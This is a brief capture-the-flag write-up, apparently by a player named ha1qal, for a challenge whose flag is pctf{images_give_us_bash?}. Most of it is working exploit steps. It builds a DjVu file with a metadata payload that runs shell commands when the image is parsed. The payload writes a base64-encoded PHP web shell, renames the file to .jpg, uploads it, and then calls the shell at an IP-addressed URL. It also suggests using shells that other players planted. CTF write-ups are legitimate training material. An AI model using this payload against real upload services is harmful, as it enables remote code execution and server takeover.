create payload.txt 
```txt
(metadata "\c${system('echo PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg== | base64 -d > cmd.php')};")
```
create dummy container
```
echo "P1 1 1 0" > dummy.pbm
cjb2 dummy.pbm dummy.djvu
djvumake exploit.djvu INFO=0,0 BGjp=/dev/null ANTa=payload.txt
mv exploit.djvu exploit.jpg
```
then upload to the website and http://18.212.136.134:9090/uploads/cmd.php?c=ls to test it out
and use other people shell.php that can be interacted.

go to http://18.212.136.134:9090/uploads/pwn.php

Flag: pctf{images_give_us_bash?}

Solved by: ha1qal